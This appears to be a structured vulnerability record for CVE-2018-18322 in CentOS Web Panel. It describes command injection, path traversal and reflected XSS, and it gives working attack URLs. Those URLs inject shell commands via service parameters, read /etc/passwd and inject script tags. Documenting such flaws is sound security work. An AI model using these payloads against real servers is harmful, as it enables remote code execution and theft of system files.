```
{
  "cve": "CVE-2018-18322",
  "description": "CentOS Web Panel version 0.9.8.480 is vulnerable to multiple issues including Command Injection, Local File Inclusion, Cross-site Scripting, and Frame Injection.",
  "vulnerabilities": [
    {
      "type": "Command Injection",
      "details": "The application is vulnerable to command injection through multiple GET parameters: `service_start`, `service_restart`, `service_fullstatus`, and `service_stop`. By injecting shell commands into these parameters, an attacker can execute arbitrary code on the server.",
      "attack_vectors": [
        "http://localhost:2030/admin/index.php?service_start=opendkim;expr 268409241 - 2;x",
        "http://localhost:2030/admin/index.php?service_restart=sshd;expr 268409241 - 2;x",
         "http://localhost:2030/admin/index.php?service_fullstatus=opendkim;expr 268409241 - 2;x",
         "http://localhost:2030/admin/index.php?service_stop=named;expr 268409241 - 2;x"
      ],
       "impact": "Arbitrary code execution on the server."
    },
    {
      "type": "Local File Inclusion (LFI)",
      "details": "The application is vulnerable to local file inclusion through the `file` parameter in the `/admin/index.php` endpoint. By manipulating the parameter to include directory traversal sequences, an attacker can read sensitive files from the server, such as `/etc/passwd`.",
      "attack_vectors": [
        "http://localhost:2030/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd"
      ],
       "impact": "Reading of arbitrary files on the server."
    },
    {
      "type": "Cross-site Scripting (XSS) & Frame Injection",
      "details": "The application is vulnerable to reflected XSS and frame injection vulnerabilities. Multiple GET parameters are affected, including `fm_current_dir`, `module`, `service_start`, `service_fullstatus`, `service_restart`, `service_stop`, and `file`. By injecting JavaScript code or iframe tags into these parameters, an attacker can execute arbitrary scripts in the victim's browser or inject arbitrary content on the page.",
      "attack_vectors": [
          "http://localhost:2030/admin/fileManager2.php?frame=3&action=8&cmd_arg=design&fm_current_dir=<scRipt>alert(1)</scRipt>",
          "http://localhost:2030/admin/index.php?module=<scRipt>alert(1)</scRipt>&file=/etc/sysconfig/selinux",
          "http://localhost:2030/admin/index.php?service_start=<scRipt>alert(1)</scRipt>",
          "http://localhost:2030/admin/index.php?service_fullstatus=<scRipt>alert(1)</scRipt>",
           "http://localhost:2030/admin/index.php?service_restart=<scRipt>alert(1)</scRipt>",
           "http://localhost:2030/admin/index.php?service_stop=<scRipt>alert(1)</scRipt>",
           "http://localhost:2030/admin/index.php?module=file_editor&file=<scRipt>alert(1)</scRipt>",
           "http://localhost:2030/admin/index.php?module=<scRipt>alert(1)</scRipt>&dir=/var/log"
        ],
      "impact": "Execution of arbitrary JavaScript code in the victim's browser or injection of arbitrary content."
    }
  ],
    "root_cause": "Insufficient input validation and sanitization in the handling of GET parameters.",
    "weaknesses": [
         "Improper neutralization of special elements used in an OS command ('OS Command Injection') (CWE-78)",
        "Improper limitation of a pathname to a restricted directory ('Path Traversal') (CWE-22)",
       "Improper neutralization of input during web page generation ('Cross-site Scripting') (CWE-79)"
    ],
  "required_capabilities": "The attacker needs network access to the vulnerable web application."
}
```